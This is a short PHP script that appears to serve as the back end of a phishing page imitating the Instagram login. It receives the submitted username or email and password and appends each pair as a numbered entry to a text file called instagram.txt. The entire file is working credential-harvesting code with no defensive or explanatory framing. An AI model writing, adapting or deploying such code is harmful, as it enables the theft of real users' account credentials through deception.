<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $emailOrPhone = $_POST["ig-uname"];
    $password = $_POST["ig-pass"];

    // Open the file 'instagram.txt' for writing
    $file = fopen("instagram.txt", "a"); // Use "a" mode to append data to the file

    if ($file) {
        // Get the current number of lines in the file
        $lineCount = count(file("instagram.txt"));

        // Write the email/phone and password as numbered lines
        fwrite($file, "Entry #" . ($lineCount + 1) . ":\n");
        fwrite($file, "Username/Email: " . $emailOrPhone . "\n");
        fwrite($file, "Password: " . $password . "\n");
        fwrite($file, "\n"); // Add a blank line to separate entries

        // Close the file
        fclose($file);

        echo "success";
    } else {
        echo "failure";
    }
}
?>
